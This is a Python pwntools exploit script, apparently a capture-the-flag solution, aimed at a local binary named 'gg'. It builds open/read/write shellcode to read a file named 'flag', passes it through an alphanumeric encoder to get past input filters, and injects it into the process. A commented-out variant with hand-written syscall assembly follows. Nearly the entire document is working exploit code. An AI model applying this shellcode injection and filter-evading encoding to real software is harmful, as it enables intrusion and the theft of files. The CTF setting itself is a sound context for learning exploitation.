from pwn import *
from amd64_alphanum_encoder import alphanum_encoder
context.log_level = "debug"
context.arch = "amd64"

p = process("gg")

shellc = shellcraft.amd64.linux.open("flag\x00")
shellc += shellcraft.amd64.linux.read("rax", "rsp",0x30)
shellc += shellcraft.amd64.linux.write(1 , "rsp" , 0x30)
shellc = asm(shellc)

payload = asm("push rsi;pop rax;") + alphanum_encoder(shellc, 2)

p.send(payload)
p.interactive()


# turn 2
# shellc = asm("""
# 	read:
# 		sub rsp, 0x1000
# 		mov rsi, rsp
# 		xor rdi, rdi
# 		mov rdx, 0x100
# 		xor rax, rax
# 		syscall

# 		mov rdi, rsp
# 		xor rsi, rsi
# 		xor rdx, rdx
# 		mov rax, 2
# 		syscall

# 		mov rdi, rax
# 		mov rsi, rsp
# 		mov rdx, 0x100
# 		xor rax, rax
# 		syscall

# 		mov rdi, 1
# 		mov rsi, rsp
# 		mov rdx, 0x100
# 		mov rax, 1
# 		syscall
	
# 		mov rax, 60
# 		syscall
# 	""")
# 

# payload = asm("push rsi;pop rax;") + alphanum_encoder(shellc, 2)
# p.send(payload)
# pause() # wait for excute shellcode
# p.send("flag\x00")
p.interactive()